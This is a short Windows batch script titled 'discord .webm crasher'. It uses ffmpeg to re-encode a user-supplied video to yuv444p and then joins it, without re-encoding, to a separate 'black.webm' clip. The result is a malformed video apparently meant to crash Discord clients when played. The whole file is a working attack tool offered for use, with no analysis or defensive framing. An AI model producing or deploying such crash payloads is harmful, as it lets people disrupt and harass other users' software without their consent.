@echo off
title "discord .webm crasher"
set /p saucename=Type or drag-and-drop the source video:
set /p outname=Type output video name:
ffmpeg -i %saucename% -pix_fmt yuv444p video.webm
(
echo file video.webm
echo file black.webm
)>"sauce.txt"
ffmpeg -f concat -i sauce.txt -codec copy %outname%.webm
del "sauce.txt"
del "video.webm"
